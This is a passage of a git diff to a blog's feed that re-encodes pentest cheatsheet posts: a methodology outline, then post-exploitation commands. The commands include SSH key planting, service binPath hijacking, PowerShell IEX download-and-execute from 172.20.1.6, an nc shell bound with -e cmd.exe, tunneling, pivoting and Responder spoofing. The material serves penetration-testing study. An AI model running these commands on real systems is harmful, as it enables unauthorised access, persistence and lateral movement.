+      &lt;li&gt;Services running in active ports&lt;/li&gt;
+      &lt;li&gt;OS fingerprint&lt;/li&gt;
+      &lt;li&gt;Identify possible defenses&lt;/li&gt;
+      &lt;li&gt;Search SPF&lt;/li&gt;
+      &lt;li&gt;Subdomains&lt;/li&gt;
+      &lt;li&gt;Search by subdomain takeover&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h1 id="enumeration">Enumeration</h1>
-<p>-&gt; <a href="/enumeration">Tools/Commands</a></p>
-<ul>
-  <li><strong>Ambient analysis</strong>
-    <ul>
-      <li>Robots.txt/sitemap.xml</li>
-      <li>Brute force Directory/Pages/Files</li>
-      <li>Mirror website/Code analisys</li>
-      <li>Webserver/Accepted methods</li>
-      <li>WAF</li>
-      <li>SMB</li>
-      <li>RPC</li>
-      <li>SNMP</li>
-      <li>NFS</li>
-      <li>Indentify parameters</li>
-      <li>Bad configurations</li>
-      <li>Sensible data/default credentials</li>
-    </ul>
-  </li>
-</ul>
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;-&amp;gt; &lt;a href=&quot;/enumeration&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Ambient analysis&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Robots.txt/sitemap.xml&lt;/li&gt;
+      &lt;li&gt;Brute force Directory/Pages/Files&lt;/li&gt;
+      &lt;li&gt;Mirror website/Code analisys&lt;/li&gt;
+      &lt;li&gt;Webserver/Accepted methods&lt;/li&gt;
+      &lt;li&gt;WAF&lt;/li&gt;
+      &lt;li&gt;SMB&lt;/li&gt;
+      &lt;li&gt;RPC&lt;/li&gt;
+      &lt;li&gt;SNMP&lt;/li&gt;
+      &lt;li&gt;NFS&lt;/li&gt;
+      &lt;li&gt;Indentify parameters&lt;/li&gt;
+      &lt;li&gt;Bad configurations&lt;/li&gt;
+      &lt;li&gt;Sensible data/default credentials&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
-<h1 id="web-hacking">Web hacking</h1>
-<p>-&gt; <a href="/web-pentesting">Tools/Commands</a></p>
-<ul>
-  <li>SQL Injection.</li>
-  <li>XXE</li>
-  <li>Broken access control</li>
-  <li>XSS</li>
-  <li>Command Injection</li>
-  <li>LFI</li>
-  <li>RFI</li>
-  <li>IDOR</li>
-  <li>SSRF</li>
-  <li>CSRF</li>
-  <li>Inputs</li>
-  <li>Template injection</li>
-  <li>Subdomain Takeover</li>
-</ul>
+&lt;h1 id=&quot;web-hacking&quot;&gt;Web hacking&lt;/h1&gt;
+&lt;p&gt;-&amp;gt; &lt;a href=&quot;/web-pentesting&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;SQL Injection.&lt;/li&gt;
+  &lt;li&gt;XXE&lt;/li&gt;
+  &lt;li&gt;Broken access control&lt;/li&gt;
+  &lt;li&gt;XSS&lt;/li&gt;
+  &lt;li&gt;Command Injection&lt;/li&gt;
+  &lt;li&gt;LFI&lt;/li&gt;
+  &lt;li&gt;RFI&lt;/li&gt;
+  &lt;li&gt;IDOR&lt;/li&gt;
+  &lt;li&gt;SSRF&lt;/li&gt;
+  &lt;li&gt;CSRF&lt;/li&gt;
+  &lt;li&gt;Inputs&lt;/li&gt;
+  &lt;li&gt;Template injection&lt;/li&gt;
+  &lt;li&gt;Subdomain Takeover&lt;/li&gt;
+&lt;/ul&gt;
 
-<h1 id="exploitation">Exploitation</h1>
-<p>-&gt; <a href="/exploitation">Tools/Commands</a></p>
-<ul>
-  <li>Buffer Overflow</li>
-  <li>Public Exploits</li>
-  <li>Reverse shell</li>
-</ul>
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;-&amp;gt; &lt;a href=&quot;/exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Buffer Overflow&lt;/li&gt;
+  &lt;li&gt;Public Exploits&lt;/li&gt;
+  &lt;li&gt;Reverse shell&lt;/li&gt;
+&lt;/ul&gt;
 
-<h1 id="post-exploration">Post-exploration</h1>
-<p>-&gt; <a href="/post-exploitation">Tools/Commands</a></p>
-<ul>
-  <li>Enumeration</li>
-  <li>Privile escalation</li>
-  <li>Pivoting</li>
-</ul>
+&lt;h1 id=&quot;post-exploration&quot;&gt;Post-exploration&lt;/h1&gt;
+&lt;p&gt;-&amp;gt; &lt;a href=&quot;/post-exploitation&quot;&gt;Tools/Commands&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Enumeration&lt;/li&gt;
+  &lt;li&gt;Privile escalation&lt;/li&gt;
+  &lt;li&gt;Pivoting&lt;/li&gt;
+&lt;/ul&gt;
 
-<h1 id="report">Report</h1>]]></content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="methodologies" /><summary type="html"><![CDATA[This is a guide to the process path of pentest.]]></summary></entry><entry><title type="html">Post exploitation</title><link href="http://localhost:4000/guide/2022/01/13/post-exploitation.html" rel="alternate" type="text/html" title="Post exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/post-exploitation</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/post-exploitation.html"><![CDATA[<h1 id="privilege-escalation">Privilege escalation</h1>
+&lt;h1 id=&quot;report&quot;&gt;Report&lt;/h1&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="methodologies" /><summary type="html">This is a guide to the process path of pentest.</summary></entry><entry><title type="html">Post exploitation</title><link href="http://localhost:4000/guide/2022/01/13/post-exploitation.html" rel="alternate" type="text/html" title="Post exploitation" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/post-exploitation</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/post-exploitation.html">&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h1&gt;
 
-<h3 id="ssh">SSH</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-f</span> user <span class="c"># Attack</span>
+&lt;h3 id=&quot;ssh&quot;&gt;SSH&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; user &lt;span class=&quot;c&quot;&gt;# Attack&lt;/span&gt;
 
-<span class="c"># Victim</span>
-<span class="nb">mkdir</span>  <span class="o">(</span>home/<span class="o">)</span>~www-data/
-<span class="nb">mkdir</span> ~/.ssh/
-<span class="nb">touch</span> ~/.ssh/authorized_keys
-<span class="nb">echo</span> <span class="s2">"public_key"</span> <span class="o">&gt;</span> ~/.ssh/authorized_keys
-ssh www-data@172.0.0.1 <span class="nt">-p</span> 2222 <span class="nt">-i</span> user
-</code></pre></div></div>
+&lt;span class=&quot;c&quot;&gt;# Victim&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;home/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;~www-data/
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; ~/.ssh/
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; ~/.ssh/authorized_keys
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;public_key&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/.ssh/authorized_keys
+ssh www-data@172.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="windows">Windows</h2>
-<h3 id="automatized">Automatized</h3>
-<ul>
-  <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat">winPEAS</a></li>
-</ul>
+&lt;h2 id=&quot;windows&quot;&gt;Windows&lt;/h2&gt;
+&lt;h3 id=&quot;automatized&quot;&gt;Automatized&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat&quot;&gt;winPEAS&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="mandatory-level">Mandatory level</h3>
-<ul>
-  <li>whoami /groups</li>
-</ul>
+&lt;h3 id=&quot;mandatory-level&quot;&gt;Mandatory level&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;whoami /groups&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="services">Services</h3>
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="c"># List services</span><span class="w">
-</span><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">Sate</span><span class="p">,</span><span class="nx">PathName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Running"</span><span class="w"> </span><span class="c"># Running services</span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="c"># Informations about a service </span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="c"># Service configurations</span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">servicename</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"certutil -urlcache -f priv.exe"</span><span class="w"> </span><span class="c"># Change the path of the file</span><span class="w">
-</span><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">servicename</span><span class="w">
-</span></code></pre></div></div>
+&lt;h3 id=&quot;services&quot;&gt;Services&lt;/h3&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# List services&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Sate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PathName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Running&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Running services&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Informations about a service &lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;qc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Service configurations&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;binPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;certutil -urlcache -f priv.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Change the path of the file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;servicename&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="linux">Linux</h2>
-<h3 id="automatized-1">Automatized</h3>
-<ul>
-  <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linPEAS</a></li>
-  <li><a href="https://gtfobins.github.io/">gtfobins</a></li>
-  <li><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></li>
-</ul>
+&lt;h2 id=&quot;linux&quot;&gt;Linux&lt;/h2&gt;
+&lt;h3 id=&quot;automatized-1&quot;&gt;Automatized&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&quot;&gt;linPEAS&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;gtfobins&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot;&gt;linux-exploit-suggester&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="suidgetuid">SUID/GETUID</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt;/dev/null 
-</code></pre></div></div>
+&lt;h3 id=&quot;suidgetuid&quot;&gt;SUID/GETUID&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-print&lt;/span&gt; 2&amp;gt;/dev/null 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="permissions">Permissions</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span> <span class="c"># Programs that run as sudo</span>
+&lt;h3 id=&quot;permissions&quot;&gt;Permissions&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Programs that run as sudo&lt;/span&gt;
 
-find / <span class="nt">-type</span> f <span class="nt">-perm</span> 777 2&gt;/dev/null <span class="c"># Files with permissions</span>
+find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; 777 2&amp;gt;/dev/null &lt;span class=&quot;c&quot;&gt;# Files with permissions&lt;/span&gt;
 
-<span class="nb">ls</span> /etc/cron.<span class="k">*</span> <span class="c"># Check all crontab folders</span>
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/cron.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Check all crontab folders&lt;/span&gt;
 
-<span class="nb">uname</span> <span class="nt">-l</span> <span class="c"># Kernel and SO versions</span>
-<span class="nb">cat</span> /etc/issue
-</code></pre></div></div>
+&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Kernel and SO versions&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/issue
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="transfer-files">Transfer files</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer 80 <span class="c">#Open server</span>
-python3 <span class="nt">-m</span> http.server 80
+&lt;h2 id=&quot;transfer-files&quot;&gt;Transfer files&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80 &lt;span class=&quot;c&quot;&gt;#Open server&lt;/span&gt;
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
 
-<span class="c"># Windows</span>
-certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="o">[</span>http://172.20.1.6/file.exe]<span class="o">(</span>http://172.20.1.6/file.exe<span class="o">)</span> file.exe
-powershell.exe wget <span class="o">[</span>http://172.20.1.6/file.exe]<span class="o">(</span>http://172.20.1.6/file.exe<span class="o">)</span> <span class="nt">-OutFile</span> file.exe
-powershell.exe <span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://172.20.1.6/file.exe'</span>,<span class="s1">'file.exe'</span><span class="o">)</span>
-powershell.exe IEX<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://172.20.1.6/poc.txt'</span><span class="o">)</span> <span class="c"># Read and execute </span>
-<span class="c"># Windows hex</span>
-/usr/share/windows-resources/binaries/upx <span class="nt">-9</span> exec.exe <span class="c"># Compress</span>
-exe2hex <span class="nt">-x</span> exec.exe <span class="nt">-p</span> exec.txt <span class="c"># To hex</span>
-nc <span class="nt">-l</span> 10.10.10.10 4444 &lt; exec.txt
+&lt;span class=&quot;c&quot;&gt;# Windows&lt;/span&gt;
+certutil.exe &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;http://172.20.1.6/file.exe]&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://172.20.1.6/file.exe&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; file.exe
+powershell.exe wget &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;http://172.20.1.6/file.exe]&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://172.20.1.6/file.exe&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; file.exe
+powershell.exe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadFile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://172.20.1.6/file.exe&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;file.exe&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+powershell.exe IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://172.20.1.6/poc.txt&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Read and execute &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Windows hex&lt;/span&gt;
+/usr/share/windows-resources/binaries/upx &lt;span class=&quot;nt&quot;&gt;-9&lt;/span&gt; exec.exe &lt;span class=&quot;c&quot;&gt;# Compress&lt;/span&gt;
+exe2hex &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; exec.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; exec.txt &lt;span class=&quot;c&quot;&gt;# To hex&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 10.10.10.10 4444 &amp;lt; exec.txt
 
-<span class="c"># Linux</span>
-wget http://172.20.1.6/file.exe <span class="nt">-O</span> /tm/file.exe
-curl http://172.20.1.6/file.exe <span class="nt">-o</span> file.exe
+&lt;span class=&quot;c&quot;&gt;# Linux&lt;/span&gt;
+wget http://172.20.1.6/file.exe &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tm/file.exe
+curl http://172.20.1.6/file.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; file.exe
 
-scp /source/folder/scp.zip root@191.162.0.2:/destiny/folder <span class="c">#ssh</span>
-</code></pre></div></div>
+scp /source/folder/scp.zip root@191.162.0.2:/destiny/folder &lt;span class=&quot;c&quot;&gt;#ssh&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="tunneling">Tunneling</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Windows </span>
-nc.exe <span class="nt">-vnlp</span> 5555 <span class="nt">-s</span> 127.0.0.1 <span class="nt">-e</span> cmd.exe <span class="c"># Attacker</span>
-plink.exe <span class="nt">-ssh</span> <span class="nt">-l</span> user <span class="nt">-pw</span> root <span class="nt">-R</span> 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 <span class="c"># Victim</span>
-nc <span class="nt">-v</span> 127.0.0.1 1337 <span class="c"># Attacker</span>
+&lt;h2 id=&quot;tunneling&quot;&gt;Tunneling&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Windows &lt;/span&gt;
+nc.exe &lt;span class=&quot;nt&quot;&gt;-vnlp&lt;/span&gt; 5555 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe &lt;span class=&quot;c&quot;&gt;# Attacker&lt;/span&gt;
+plink.exe &lt;span class=&quot;nt&quot;&gt;-ssh&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;-pw&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 192.168.0.8:1337:127.0.0.1:5555 192.168.0.8 &lt;span class=&quot;c&quot;&gt;# Victim&lt;/span&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 127.0.0.1 1337 &lt;span class=&quot;c&quot;&gt;# Attacker&lt;/span&gt;
 
-<span class="c"># Linux</span>
+&lt;span class=&quot;c&quot;&gt;# Linux&lt;/span&gt;
 socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
 socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22
 
-ssh www-data@172.0.0.1 <span class="nt">-p</span> 2222 <span class="nt">-i</span> us <span class="nt">-L</span> 3333:127.0.0.1:3306
-</code></pre></div></div>
+ssh www-data@172.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; us &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 3333:127.0.0.1:3306
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="pivoting">Pivoting</h2>
-<p>Meterpreter</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig <span class="c"># Networks interface</span>
-route <span class="c"># Identify network</span>
+&lt;h2 id=&quot;pivoting&quot;&gt;Pivoting&lt;/h2&gt;
+&lt;p&gt;Meterpreter&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ipconfig &lt;span class=&quot;c&quot;&gt;# Networks interface&lt;/span&gt;
+route &lt;span class=&quot;c&quot;&gt;# Identify network&lt;/span&gt;
 
-run autoroute <span class="nt">-s</span> 10.0.20.0/24 <span class="c">#Add a route to our machine</span>
-use auxiliary/server/sock4a <span class="c"># Create a proxy in port 1080</span>
-nano /ect/proxychains.conf <span class="c"># Add this proxy to proxychains</span>
-proxychains nmap <span class="nt">-v</span> —open <span class="nt">-sT</span> <span class="nt">-p</span> 110,139 <span class="nt">-Pn</span> 10.10.20.0/24 <span class="c"># The network is visible</span>
+run autoroute &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.0.20.0/24 &lt;span class=&quot;c&quot;&gt;#Add a route to our machine&lt;/span&gt;
+use auxiliary/server/sock4a &lt;span class=&quot;c&quot;&gt;# Create a proxy in port 1080&lt;/span&gt;
+nano /ect/proxychains.conf &lt;span class=&quot;c&quot;&gt;# Add this proxy to proxychains&lt;/span&gt;
+proxychains nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; —open &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 110,139 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.20.0/24 &lt;span class=&quot;c&quot;&gt;# The network is visible&lt;/span&gt;
 V
-portfwd add <span class="nt">-l</span> 110 <span class="nt">-p</span> 110 <span class="nt">-r</span> 10.20.20.4 <span class="c"># Portfoward  a specific port</span>
-nmap <span class="nt">-sV</span> <span class="nt">-p</span> 110 127.0.0.10 <span class="c"># Can acess this port</span>
-</code></pre></div></div>
+portfwd add &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 110 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 110 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 10.20.20.4 &lt;span class=&quot;c&quot;&gt;# Portfoward  a specific port&lt;/span&gt;
+nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 110 127.0.0.10 &lt;span class=&quot;c&quot;&gt;# Can acess this port&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="internal-pentest">Internal pentest</h2>
-<h3 id="responder">Responder</h3>
-<p>A LLMNR &amp; NBT-NS Spoofing Attack.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /etc/responder/Responder.conf <span class="c"># Configure the ips field RespondTo</span>
+&lt;h2 id=&quot;internal-pentest&quot;&gt;Internal pentest&lt;/h2&gt;
+&lt;h3 id=&quot;responder&quot;&gt;Responder&lt;/h3&gt;
